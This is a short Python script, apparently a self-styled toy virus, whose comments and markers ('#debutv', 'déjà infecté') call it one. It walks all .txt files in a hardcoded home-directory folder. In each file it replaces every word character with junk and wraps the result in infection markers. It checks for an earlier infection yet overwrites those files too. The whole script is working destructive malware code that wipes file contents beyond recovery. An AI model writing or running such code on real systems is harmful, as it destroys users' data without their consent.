import glob
import os
import re

id_start_virus = "#debutv\n"
id_end_virus = "#finv\n"
pattern = "^#debutv"
replacement = "34xx%#$"
buf = []


files = glob.glob("/home/stephane/python-projects/.venv/hist/*.txt")
files.sort()

for file in files:

    # lecture - écriture
    with open(file, "r+") as f:
        # print (f.name)
        content = f.read()

        if re.match(pattern, content):
            print(f"{f.name} déjà infecté")

        f.seek(0)
        c = re.sub(r'\w', replacement, content)
        # print(c)
        f.write(id_start_virus + c + id_end_virus)
